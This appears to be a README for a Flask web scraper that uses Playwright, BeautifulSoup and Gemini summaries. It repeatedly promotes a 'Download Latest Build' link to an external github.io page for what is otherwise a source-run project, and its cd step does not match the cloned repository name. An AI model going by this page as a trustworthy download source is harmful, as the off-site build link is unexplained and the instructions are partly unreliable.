# AI Web Scraper - AI Web Scraping Tool 2026

> **AI Web Scraper is a Flask and Python web application for collecting data from both static and JavaScript-rendered webpages, identifying structured content, and creating summaries with Gemini.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/taylorchriskruw5880/ai-web-scraper-tool?style=flat-square)](https://github.com/taylorchriskruw5880/ai-web-scraper-tool)

---

<p align="center">
  <a href="https://taylorchriskruw5880.github.io/ai-web-scraper-tool/">
    <img src="https://img.shields.io/badge/Download-AI%20Web%20Scraper%20Latest-brightgreen?style=for-the-badge" alt="Download AI Web Scraper">
  </a>
</p>

> **[Download AI Web Scraper](https://taylorchriskruw5880.github.io/ai-web-scraper-tool/)**

---

[Download Latest Build](https://taylorchriskruw5880.github.io/ai-web-scraper-tool/)

---

## Overview

AI Web Scraper offers a browser-based way to retrieve and inspect webpage content. Flask provides the application layer, BeautifulSoup handles page parsing, and Playwright supplies browser automation for sites that render their content with JavaScript.

Once a page has been processed, Gemini AI can turn the collected material into a summary. The web interface remains intentionally simple and includes a loading indicator so you can track operations that take longer to complete.

---

## What It Can Do

- Retrieve information from static webpages.
- Load JavaScript-dependent sites with a Playwright headless browser.
- Process HTML using BeautifulSoup.
- Identify structured data within online documents.
- Generate Gemini AI summaries from scraped content.
- Provide a lightweight Flask web interface.
- Show progress through a loading indicator during scraping.

---

## Getting Started

First, download the source and enter its directory:

```bash
git clone https://github.com/taylorchriskruw5880/ai-web-scraper-tool.git
cd AI-Web-Scraper
```

Install the required Python packages:

```bash
pip install -r requirements.txt
```

Install the browser components used by Playwright:

```bash
playwright install
```

Launch the application through Flask:

```bash
flask run
```

Then visit the local URL reported by Flask in your web browser.

---

## How to Use

1. Run the Flask application.
2. Navigate to its web interface.
3. Provide the URL of the webpage to examine.
4. Submit the scraping job.
5. Let the loading indicator complete.
6. Inspect the extracted data and the summary produced by Gemini.

When a target site builds its content with JavaScript, Playwright can load the page before the scraper begins processing it.

---

## Gemini Setup

Supply Gemini settings through the configuration method supported by the application. API credentials should remain outside the repository and should not be placed directly in source files.

For example, a local environment file might contain:

```env
GEMINI_API_KEY=your_api_key_here
```

Use the configuration keys and available options defined by the files in this repository.

---

## Prerequisites

To run AI Web Scraper, you need:

- A Python runtime.
- Flask.
- BeautifulSoup.
- Playwright together with its installed browsers.
- Gemini AI access for summary generation.
- A browser for opening the Flask interface.
- Network connectivity to the webpages being scraped.

The required storage can vary according to how much webpage content is processed in a scraping session.

---

## Frequently Asked Questions

### Which websites are supported?

The application can work with conventional static pages as well as sites that render their content through JavaScript.

### What role does Playwright play?

Playwright opens pages in a headless browser, allowing content generated or fetched by JavaScript to be loaded before extraction.

### Is Gemini needed for every scrape?

No. Gemini handles content summarization, while retrieving pages and extracting information are handled independently.

### How do I provide Gemini credentials?

Set them through the environment or configuration approach supported by the project. Do not commit API keys to version control.

### What should I do if the app will not launch?

Check that the Python requirements were installed, the Playwright browser components are present, and the Flask command corresponds to the project’s entry point.

### Where can I find newer versions?

Review the repository for newer commits and use the latest build available through the project download link.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
